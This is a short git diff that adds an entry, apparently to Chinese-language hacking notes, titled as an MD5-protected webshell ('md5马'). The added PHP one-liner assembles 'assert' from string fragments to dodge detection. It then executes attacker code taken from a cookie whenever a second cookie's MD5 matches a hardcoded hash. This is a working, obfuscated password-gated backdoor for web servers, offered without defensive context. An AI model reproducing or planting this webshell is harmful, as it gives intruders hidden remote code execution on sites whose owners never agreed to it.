@@ -309,4 +309,10 @@ a17ef5f51631bba2b7098bdeee4d729566668888
 #### grep 带有特俗字符的文件   sed -i替换
 
 
+md5马
+```
+//v5est0r
+<?php $a="a"."s"."se"."rt";if (md5($_COOKIE[2])==="10972d718c21fdc8718efbaa8e67740e"){$a($_COOKIE[1]);}?>
+```
+
 
